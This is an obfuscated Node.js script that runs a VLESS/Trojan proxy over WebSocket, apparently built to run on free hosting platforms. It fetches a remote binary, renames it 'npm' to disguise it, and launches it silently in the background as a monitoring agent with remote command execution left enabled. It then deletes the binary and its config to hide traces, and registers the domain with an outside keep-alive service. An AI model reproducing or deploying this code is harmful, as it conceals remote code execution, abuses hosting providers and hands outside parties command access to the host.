const _0x2b0294=_0x50cb;(function(_0x133f19,_0x3d2385){const _0x461a84=_0x50cb,_0x2eb190=_0x133f19();while(!![]){try{const _0x45d425=parseInt(_0x461a84(0x188))/0x1+-parseInt(_0x461a84(0x177))/0x2+parseInt(_0x461a84(0x1d4))/0x3*(parseInt(_0x461a84(0x1b1))/0x4)+-parseInt(_0x461a84(0x197))/0x5+-parseInt(_0x461a84(0x18f))/0x6+-parseInt(_0x461a84(0x17a))/0x7*(-parseInt(_0x461a84(0x176))/0x8)+parseInt(_0x461a84(0x190))/0x9*(-parseInt(_0x461a84(0x18e))/0xa);if(_0x45d425===_0x3d2385)break;else _0x2eb190['push'](_0x2eb190['shift']());}catch(_0x1782e4){_0x2eb190['push'](_0x2eb190['shift']());}}}(_0x2c43,0x52516));const os=require('os'),http=require(_0x2b0294(0x1d9)),fs=require('fs'),axios=require(_0x2b0294(0x1b0)),net=require('net'),path=require('path'),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require(_0x2b0294(0x19a)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x2b0294(0x1a8)][_0x2b0294(0x1c1)]||_0x2b0294(0x1c7),NEZHA_SERVER=process[_0x2b0294(0x1a8)][_0x2b0294(0x1c3)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x2b0294(0x1a8)][_0x2b0294(0x1a9)]||'',DOMAIN=process[_0x2b0294(0x1a8)]['DOMAIN']||_0x2b0294(0x1b8),AUTO_ACCESS=process['env'][_0x2b0294(0x1b5)]||!![],WSPATH=process[_0x2b0294(0x1a8)]['WSPATH']||UUID[_0x2b0294(0x187)](0x0,0x8),SUB_PATH=process[_0x2b0294(0x1a8)][_0x2b0294(0x1b4)]||'sub',NAME=process[_0x2b0294(0x1a8)][_0x2b0294(0x1a5)]||'Hug',PORT=process['env'][_0x2b0294(0x193)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x440c36=_0x2b0294;try{const _0x4e4853=await axios['get']('https://speed.cloudflare.com/meta'),_0x15c131=_0x4e4853[_0x440c36(0x194)];ISP=(_0x15c131[_0x440c36(0x192)]+'-'+_0x15c131[_0x440c36(0x1b9)])[_0x440c36(0x1a0)](/ /g,'_');}catch(_0xac6dec){ISP=_0x440c36(0x1a4);}};GetISP();const httpServer=http[_0x2b0294(0x1d1)]((_0x2706db,_0x30b64d)=>{const _0x127eee=_0x2b0294;if(_0x2706db[_0x127eee(0x1a7)]==='/'){const _0x56e030=path[_0x127eee(0x1da)](__dirname,_0x127eee(0x175));fs[_0x127eee(0x182)](_0x56e030,_0x127eee(0x1b7),(_0x2e7a02,_0x1e2b38)=>{const _0xb8d5b9=_0x127eee;if(_0x2e7a02){_0x30b64d['writeHead'](0xc8,{'Content-Type':_0xb8d5b9(0x1be)}),_0x30b64d['end'](_0xb8d5b9(0x1c2));return;}_0x30b64d[_0xb8d5b9(0x1af)](0xc8,{'Content-Type':'text/html'}),_0x30b64d[_0xb8d5b9(0x19f)](_0x1e2b38);});return;}else{if(_0x2706db[_0x127eee(0x1a7)]==='/'+SUB_PATH){const _0x58686c=_0x127eee(0x1c5)+UUID+'@'+DOMAIN+_0x127eee(0x1c9)+DOMAIN+_0x127eee(0x17c)+DOMAIN+_0x127eee(0x19b)+WSPATH+'#'+NAME+'-'+ISP,_0x4a87a7='trojan://'+UUID+'@'+DOMAIN+_0x127eee(0x185)+DOMAIN+_0x127eee(0x17c)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x25727c=_0x58686c+'\x0a'+_0x4a87a7,_0xdbfc69=Buffer['from'](_0x25727c)[_0x127eee(0x195)](_0x127eee(0x196));_0x30b64d['writeHead'](0xc8,{'Content-Type':_0x127eee(0x1b6)}),_0x30b64d[_0x127eee(0x19f)](_0xdbfc69+'\x0a');}else _0x30b64d[_0x127eee(0x1af)](0x194,{'Content-Type':_0x127eee(0x1b6)}),_0x30b64d[_0x127eee(0x19f)](_0x127eee(0x1a6));}}),wss=new WebSocket[(_0x2b0294(0x1d8))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x2b0294(0x16f),'1.1.1.1'];function resolveHost(_0x23418f){return new Promise((_0x532a10,_0x221807)=>{const _0x1da205=_0x50cb;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x1da205(0x189)](_0x23418f)){_0x532a10(_0x23418f);return;}let _0x58e9a4=0x0;function _0x2ad362(){const _0xfb34b2=_0x1da205;if(_0x58e9a4>=DNS_SERVERS[_0xfb34b2(0x17b)]){_0x221807(new Error('Failed\x20to\x20resolve\x20'+_0x23418f+_0xfb34b2(0x199)));return;}const _0x525ff8=DNS_SERVERS[_0x58e9a4];_0x58e9a4++;const _0x5e6421='https://dns.google/resolve?name='+encodeURIComponent(_0x23418f)+_0xfb34b2(0x1cc);axios['get'](_0x5e6421,{'timeout':0x1388,'headers':{'Accept':_0xfb34b2(0x1c6)}})[_0xfb34b2(0x1aa)](_0x5ea8b7=>{const _0x583db6=_0xfb34b2,_0x395418=_0x5ea8b7['data'];if(_0x395418[_0x583db6(0x198)]===0x0&&_0x395418['Answer']&&_0x395418['Answer'][_0x583db6(0x17b)]>0x0){const _0x5b9df7=_0x395418[_0x583db6(0x181)][_0x583db6(0x17d)](_0x686888=>_0x686888[_0x583db6(0x1dc)]===0x1);if(_0x5b9df7){_0x532a10(_0x5b9df7[_0x583db6(0x194)]);return;}}_0x2ad362();})['catch'](_0x41a168=>{_0x2ad362();});}_0x2ad362();});}function _0x2c43(){const _0x503d2b=['finish','client_secret:\x20',':443?security=tls&sni=','includes','slice','350639MgPTOZ','test','connection','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','catch','decode','50mbOhfb','956604frPgRs','351423btkXWB','substr','country','PORT','data','toString','base64','1633575qpogFA','Status','\x20with\x20all\x20DNS\x20servers','child_process','&path=%2F','once','listen','Server\x20is\x20running\x20on\x20port\x20','end','replace','write','application/json','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Unknown','NAME','Not\x20Found\x0a','url','env','NEZHA_KEY','then','2083','utf-8','https://amd64.ssss.nyc.mn/v1','concat','writeHead','axios','997532jRsHFX','readUInt8','chmod\x20+x\x20npm','SUB_PATH','AUTO_ACCESS','text/plain','utf8','1234.abc.com','asOrganization','error','unlink','https://amd64.ssss.nyc.mn/agent','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','text/html','reduce','pop','UUID','Hello\x20world!','NEZHA_SERVER','every','vless://','application/dns-json','4f836c6b-9b5a-4ee0-9a84-7eae4a8981c1','npm\x20is\x20running',':443?encryption=none&security=tls&sni=','log','get','&type=A','https://oooo.serv00.net/add-url','readUInt16BE','digest','split','createServer','update','npm\x20running\x20error:','3bbsqBd','createHash','sha224','aarch64','Server','http','join','connect','type','--tls','setsid\x20nohup\x20./npm\x20-s\x20','\x20-p\x20','config.yaml','https://arm64.ssss.nyc.mn/v1','createWriteStream','close','2096','message','8.8.4.4','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','2087','/bin/bash','https://arm64.ssss.nyc.mn/agent','stream','index.html','47224kcGuSM','426170KODnwC','pipe','npm','749WUCiYa','length','&fp=chrome&type=ws&host=','find','arch','2053','map','Answer','readFile'];_0x2c43=function(){return _0x503d2b;};return _0x2c43();}function handleVlessConnection(_0x3c30e7,_0x5ebb2b){const _0x35810b=_0x2b0294,[_0x25af4b]=_0x5ebb2b,_0x2c67ee=_0x5ebb2b[_0x35810b(0x187)](0x1,0x11);if(!_0x2c67ee['every']((_0x38f0c6,_0x4f518f)=>_0x38f0c6==parseInt(uuid[_0x35810b(0x191)](_0x4f518f*0x2,0x2),0x10)))return![];let _0x47eaa2=_0x5ebb2b['slice'](0x11,0x12)[_0x35810b(0x1b2)]()+0x13;const _0x7499fe=_0x5ebb2b[_0x35810b(0x187)](_0x47eaa2,_0x47eaa2+=0x2)['readUInt16BE'](0x0),_0x4e538a=_0x5ebb2b[_0x35810b(0x187)](_0x47eaa2,_0x47eaa2+=0x1)[_0x35810b(0x1b2)](),_0x49917f=_0x4e538a==0x1?_0x5ebb2b[_0x35810b(0x187)](_0x47eaa2,_0x47eaa2+=0x4)['join']('.'):_0x4e538a==0x2?new TextDecoder()[_0x35810b(0x18d)](_0x5ebb2b[_0x35810b(0x187)](_0x47eaa2+0x1,_0x47eaa2+=0x1+_0x5ebb2b[_0x35810b(0x187)](_0x47eaa2,_0x47eaa2+0x1)['readUInt8']())):_0x4e538a==0x3?_0x5ebb2b[_0x35810b(0x187)](_0x47eaa2,_0x47eaa2+=0x10)[_0x35810b(0x1bf)]((_0x38e4a7,_0x274207,_0x597653,_0x41d4f6)=>_0x597653%0x2?_0x38e4a7['concat'](_0x41d4f6[_0x35810b(0x187)](_0x597653-0x1,_0x597653+0x1)):_0x38e4a7,[])[_0x35810b(0x180)](_0x155f73=>_0x155f73[_0x35810b(0x1ce)](0x0)['toString'](0x10))['join'](':'):'';_0x3c30e7['send'](new Uint8Array([_0x25af4b,0x0]));const _0x39b20c=createWebSocketStream(_0x3c30e7);return resolveHost(_0x49917f)[_0x35810b(0x1aa)](_0x484139=>{const _0x3d7743=_0x35810b;net[_0x3d7743(0x1db)]({'host':_0x484139,'port':_0x7499fe},function(){const _0x45faae=_0x3d7743;this['write'](_0x5ebb2b[_0x45faae(0x187)](_0x47eaa2)),_0x39b20c['on'](_0x45faae(0x1ba),()=>{})[_0x45faae(0x178)](this)['on'](_0x45faae(0x1ba),()=>{})['pipe'](_0x39b20c);})['on']('error',()=>{});})[_0x35810b(0x18c)](_0x1e6d69=>{const _0x134b73=_0x35810b;net[_0x134b73(0x1db)]({'host':_0x49917f,'port':_0x7499fe},function(){const _0x4c8e32=_0x134b73;this[_0x4c8e32(0x1a1)](_0x5ebb2b['slice'](_0x47eaa2)),_0x39b20c['on'](_0x4c8e32(0x1ba),()=>{})[_0x4c8e32(0x178)](this)['on']('error',()=>{})[_0x4c8e32(0x178)](_0x39b20c);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0xda2a6b,_0x402639){const _0x50b1b1=_0x2b0294;try{if(_0x402639['length']<0x3a)return![];const _0x57c61a=_0x402639[_0x50b1b1(0x187)](0x0,0x38)[_0x50b1b1(0x195)](),_0x2d07cd=[UUID];let _0x6d98b1=null;for(const _0x5dd918 of _0x2d07cd){const _0x51db92=crypto[_0x50b1b1(0x1d5)](_0x50b1b1(0x1d6))[_0x50b1b1(0x1d2)](_0x5dd918)[_0x50b1b1(0x1cf)]('hex');if(_0x51db92===_0x57c61a){_0x6d98b1=_0x5dd918;break;}}if(!_0x6d98b1)return![];let _0x449aff=0x38;_0x402639[_0x449aff]===0xd&&_0x402639[_0x449aff+0x1]===0xa&&(_0x449aff+=0x2);const _0x311cae=_0x402639[_0x449aff];if(_0x311cae!==0x1)return![];_0x449aff+=0x1;const _0x505448=_0x402639[_0x449aff];_0x449aff+=0x1;let _0x4cf05a,_0x3dab5b;if(_0x505448===0x1)_0x4cf05a=_0x402639[_0x50b1b1(0x187)](_0x449aff,_0x449aff+0x4)['join']('.'),_0x449aff+=0x4;else{if(_0x505448===0x3){const _0x1a201d=_0x402639[_0x449aff];_0x449aff+=0x1,_0x4cf05a=_0x402639[_0x50b1b1(0x187)](_0x449aff,_0x449aff+_0x1a201d)['toString'](),_0x449aff+=_0x1a201d;}else{if(_0x505448===0x4)_0x4cf05a=_0x402639[_0x50b1b1(0x187)](_0x449aff,_0x449aff+0x10)[_0x50b1b1(0x1bf)]((_0x2f9816,_0x5f2529,_0xc77f48,_0x32627c)=>_0xc77f48%0x2?_0x2f9816[_0x50b1b1(0x1ae)](_0x32627c['slice'](_0xc77f48-0x1,_0xc77f48+0x1)):_0x2f9816,[])[_0x50b1b1(0x180)](_0x1590c3=>_0x1590c3[_0x50b1b1(0x1ce)](0x0)[_0x50b1b1(0x195)](0x10))['join'](':'),_0x449aff+=0x10;else return![];}}_0x3dab5b=_0x402639[_0x50b1b1(0x1ce)](_0x449aff),_0x449aff+=0x2;_0x449aff<_0x402639[_0x50b1b1(0x17b)]&&_0x402639[_0x449aff]===0xd&&_0x402639[_0x449aff+0x1]===0xa&&(_0x449aff+=0x2);const _0x543edd=createWebSocketStream(_0xda2a6b);return resolveHost(_0x4cf05a)['then'](_0x4d1800=>{const _0x5b43b6=_0x50b1b1;net[_0x5b43b6(0x1db)]({'host':_0x4d1800,'port':_0x3dab5b},function(){const _0x5d5aa6=_0x5b43b6;_0x449aff<_0x402639[_0x5d5aa6(0x17b)]&&this[_0x5d5aa6(0x1a1)](_0x402639['slice'](_0x449aff)),_0x543edd['on'](_0x5d5aa6(0x1ba),()=>{})['pipe'](this)['on']('error',()=>{})[_0x5d5aa6(0x178)](_0x543edd);})['on'](_0x5b43b6(0x1ba),()=>{});})['catch'](_0x236106=>{const _0x1b3b5d=_0x50b1b1;net[_0x1b3b5d(0x1db)]({'host':_0x4cf05a,'port':_0x3dab5b},function(){const _0x144376=_0x1b3b5d;_0x449aff<_0x402639[_0x144376(0x17b)]&&this[_0x144376(0x1a1)](_0x402639[_0x144376(0x187)](_0x449aff)),_0x543edd['on'](_0x144376(0x1ba),()=>{})['pipe'](this)['on'](_0x144376(0x1ba),()=>{})[_0x144376(0x178)](_0x543edd);})['on'](_0x1b3b5d(0x1ba),()=>{});}),!![];}catch(_0x55905a){return![];}}function _0x50cb(_0x355e12,_0x4199ba){const _0x2c43c4=_0x2c43();return _0x50cb=function(_0x50cb81,_0x3511dd){_0x50cb81=_0x50cb81-0x169;let _0x4f3fa6=_0x2c43c4[_0x50cb81];return _0x4f3fa6;},_0x50cb(_0x355e12,_0x4199ba);}wss['on'](_0x2b0294(0x18a),(_0xd3d9d7,_0x3edfa4)=>{const _0x4fbf56=_0x2b0294,_0xdd9349=_0x3edfa4[_0x4fbf56(0x1a7)]||'';_0xd3d9d7[_0x4fbf56(0x19c)](_0x4fbf56(0x16e),_0x43511b=>{const _0x4dd9b2=_0x4fbf56;if(_0x43511b[_0x4dd9b2(0x17b)]>0x11&&_0x43511b[0x0]===0x0){const _0x4a7c7d=_0x43511b[_0x4dd9b2(0x187)](0x1,0x11),_0x522e8f=_0x4a7c7d[_0x4dd9b2(0x1c4)]((_0x2f82c4,_0x107a5f)=>_0x2f82c4==parseInt(uuid[_0x4dd9b2(0x191)](_0x107a5f*0x2,0x2),0x10));if(_0x522e8f){!handleVlessConnection(_0xd3d9d7,_0x43511b)&&_0xd3d9d7['close']();return;}}!handleTrojanConnection(_0xd3d9d7,_0x43511b)&&_0xd3d9d7[_0x4dd9b2(0x16c)]();})['on'](_0x4fbf56(0x1ba),()=>{});});const getDownloadUrl=()=>{const _0x589da1=_0x2b0294,_0x5ce93f=os[_0x589da1(0x17e)]();return _0x5ce93f==='arm'||_0x5ce93f==='arm64'||_0x5ce93f===_0x589da1(0x1d7)?!NEZHA_PORT?_0x589da1(0x16a):_0x589da1(0x173):!NEZHA_PORT?_0x589da1(0x1ad):_0x589da1(0x1bc);},downloadFile=async()=>{const _0x56d117=_0x2b0294;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0xf8badb=getDownloadUrl(),_0x548b97=await axios({'method':_0x56d117(0x1cb),'url':_0xf8badb,'responseType':_0x56d117(0x174)}),_0x116fd0=fs[_0x56d117(0x16b)](_0x56d117(0x179));return _0x548b97[_0x56d117(0x194)][_0x56d117(0x178)](_0x116fd0),new Promise((_0x5dd335,_0x3e4402)=>{const _0x3b367d=_0x56d117;_0x116fd0['on'](_0x3b367d(0x183),()=>{const _0x296a7f=_0x3b367d;console[_0x296a7f(0x1ca)]('npm\x20download\x20successfully'),exec(_0x296a7f(0x1b3),_0x462604=>{if(_0x462604)_0x3e4402(_0x462604);_0x5dd335();});}),_0x116fd0['on'](_0x3b367d(0x1ba),_0x3e4402);});}catch(_0x496d3a){throw _0x496d3a;}},runnz=async()=>{const _0x19c027=_0x2b0294;try{const _0x224670=execSync(_0x19c027(0x1bd),{'encoding':_0x19c027(0x1ac)});if(_0x224670['trim']()!==''){console[_0x19c027(0x1ca)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x2ba6be){}await downloadFile();let _0x5cffb8='',_0x4e1679=['443','8443',_0x19c027(0x16d),_0x19c027(0x171),_0x19c027(0x1ab),_0x19c027(0x17f)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xb1345e=_0x4e1679['includes'](NEZHA_PORT)?_0x19c027(0x1dd):'';_0x5cffb8=_0x19c027(0x1de)+NEZHA_SERVER+':'+NEZHA_PORT+_0x19c027(0x1df)+NEZHA_KEY+'\x20'+_0xb1345e+_0x19c027(0x1a3);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3c123e=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x19c027(0x1d0)](':')[_0x19c027(0x1c0)]():'',_0xcb4069=_0x4e1679[_0x19c027(0x186)](_0x3c123e)?'true':'false',_0x1ba841=_0x19c027(0x184)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x19c027(0x18b)+_0xcb4069+_0x19c027(0x170)+UUID;fs['writeFileSync']('config.yaml',_0x1ba841);}_0x5cffb8='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x19c027(0x1ca)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x5cffb8,{'shell':_0x19c027(0x172)},_0x4f0a42=>{const _0x3ba5e6=_0x19c027;if(_0x4f0a42)console[_0x3ba5e6(0x1ba)](_0x3ba5e6(0x1d3),_0x4f0a42);else console[_0x3ba5e6(0x1ca)](_0x3ba5e6(0x1c8));});}catch(_0x56e0cc){console[_0x19c027(0x1ba)]('error:\x20'+_0x56e0cc);}};async function addAccessTask(){const _0x164125=_0x2b0294;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x7a8de7='https://'+DOMAIN;try{const _0xd37bf3=await axios['post'](_0x164125(0x1cd),{'url':_0x7a8de7},{'headers':{'Content-Type':_0x164125(0x1a2)}});console[_0x164125(0x1ca)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0xca3dab){}}const delFiles=()=>{const _0x555aa7=_0x2b0294;fs[_0x555aa7(0x1bb)](_0x555aa7(0x179),()=>{}),fs['unlink'](_0x555aa7(0x169),()=>{});};httpServer[_0x2b0294(0x19d)](PORT,()=>{const _0x2e8575=_0x2b0294;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x2e8575(0x1ca)](_0x2e8575(0x19e)+PORT);});
